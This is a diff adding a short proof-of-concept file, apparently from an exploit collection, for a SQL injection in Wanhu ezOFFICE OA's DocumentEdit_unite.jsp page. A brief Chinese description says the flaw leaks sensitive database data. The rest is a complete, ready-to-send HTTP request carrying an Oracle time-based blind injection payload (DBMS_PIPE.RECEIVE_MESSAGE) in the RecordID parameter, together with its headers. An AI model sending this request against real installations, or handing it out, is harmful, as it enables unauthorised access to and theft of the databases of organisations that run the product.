@@ -1,0 +1,9 @@
+# 万户OA DocumentEdit_unite.jsp SQL注入漏洞
+# 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。万户OA DocumentEdit_unite 存在SQL注入漏洞，攻击者通过漏洞获取数据库敏感信息。
+GET /defaultroot/public/iWebOfficeSign/DocumentEdit_unite.jsp;?RecordID=2%27+AND+6205%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2898%29%7C%7CCHR%2866%29%7C%7CCHR%2890%29%7C%7CCHR%28108%29%2C5%29--+YJdO&acid=80051430&bid=hd_tag_m8mv23qx HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23qx
+RM-PRO-Token: 0ab7ef3c8b27220e81926f619eb7c6f9
+RM-PRO-Time: 1742808338695
+User-Agent: curl/7.83.1
+
